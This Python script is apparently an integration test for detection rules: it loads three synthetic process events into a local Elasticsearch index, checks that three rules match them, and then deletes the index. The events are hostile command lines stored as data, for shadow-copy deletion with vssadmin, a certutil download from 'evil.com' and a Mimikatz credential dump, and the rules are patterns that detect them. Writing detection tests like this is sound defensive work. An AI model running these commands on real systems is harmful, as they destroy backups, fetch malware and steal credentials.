import sys
import time
import requests

ES = "http://localhost:9200"
INDEX = "logs-test"
REQUEST_TIMEOUT = 10  # seconds

MAPPING = {
    "mappings": {
        "properties": {
            "@timestamp": {"type": "date"},
            "process.name": {"type": "keyword"},
            "process.command_line": {"type": "keyword"},
            "event.category": {"type": "keyword"},
            "event.type": {"type": "keyword"},
        }
    }
}

EVENTS = [
    {
        "@timestamp": "2024-01-01T00:00:00Z",
        "process.name": "vssadmin.exe",
        "process.command_line": "vssadmin delete shadows /all /quiet",
        "event.category": "process",
        "event.type": "start",
    },
    {
        "@timestamp": "2024-01-01T00:01:00Z",
        "process.name": "certutil.exe",
        "process.command_line": "certutil -urlcache -split -f http://evil.com/payload.exe",
        "event.category": "process",
        "event.type": "start",
    },
    {
        "@timestamp": "2024-01-01T00:02:00Z",
        "process.name": "mimikatz.exe",
        "process.command_line": "mimikatz.exe sekurlsa::logonpasswords",
        "event.category": "process",
        "event.type": "start",
    },
]

RULES = [
    {
        "name": "Shadow Copy Deletion",
        "query": {"bool": {"must": [
            {"term": {"process.name": "vssadmin.exe"}},
            {"wildcard": {"process.command_line": "*delete shadows*"}},
        ]}},
    },
    {
        "name": "Certutil URL Download",
        "query": {"bool": {"must": [
            {"term": {"process.name": "certutil.exe"}},
            {"wildcard": {"process.command_line": "*urlcache*"}},
        ]}},
    },
    {
        "name": "Mimikatz Execution",
        "query": {"term": {"process.name": "mimikatz.exe"}},
    },
]


def cleanup_index() -> None:
    """Guaranteed cleanup: delete the test index if it exists."""
    try:
        requests.delete(f"{ES}/{INDEX}", timeout=REQUEST_TIMEOUT)
    except requests.RequestException:
        pass  # Index may not exist; ignore cleanup errors


def main() -> int:
    try:
        # Create index
        try:
            response = requests.put(f"{ES}/{INDEX}", json=MAPPING, timeout=REQUEST_TIMEOUT)
        except requests.RequestException as error:
            print(f"FAIL: create index: {type(error).__name__}")
            return 1

        if response.status_code not in (200, 201):
            print(f"FAIL: create index: status {response.status_code}")
            return 1

        # Inject events
        for i, event in enumerate(EVENTS):
            try:
                response = requests.post(f"{ES}/{INDEX}/_doc", json=event, timeout=REQUEST_TIMEOUT)
            except requests.RequestException as error:
                print(f"FAIL: inject event {i}: {type(error).__name__}")
                return 1

            if response.status_code not in (200, 201):
                print(f"FAIL: inject event {i}: status {response.status_code}")
                return 1

        # Refresh to make docs searchable
        try:
            requests.post(f"{ES}/{INDEX}/_refresh", timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            pass  # Refresh failures are non-fatal
        time.sleep(1)

        # Verify rules match
        failures = 0
        for rule in RULES:
            try:
                response = requests.post(
                    f"{ES}/{INDEX}/_search",
                    json={"query": rule["query"]},
                    timeout=REQUEST_TIMEOUT,
                )
            except requests.RequestException as error:
                print(f"FAIL: search for '{rule['name']}': {type(error).__name__}")
                failures += 1
                continue

            if response.status_code != 200:
                print(f"FAIL: search for '{rule['name']}': status {response.status_code}")
                failures += 1
                continue

            try:
                hits = response.json().get("hits", {}).get("total", {}).get("value", 0)
            except ValueError:
                print(f"FAIL: '{rule['name']}': invalid response JSON")
                failures += 1
                continue

            if hits == 0:
                print(f"FAIL: '{rule['name']}' matched 0 events")
                failures += 1
            else:
                print(f"PASS: '{rule['name']}' matched {hits} event(s)")

        if failures:
            print(f"\n{failures} rule(s) failed")
            return 1

        print("\nAll integration tests passed")
        return 0

    finally:
        cleanup_index()


if __name__ == "__main__":
    sys.exit(main())
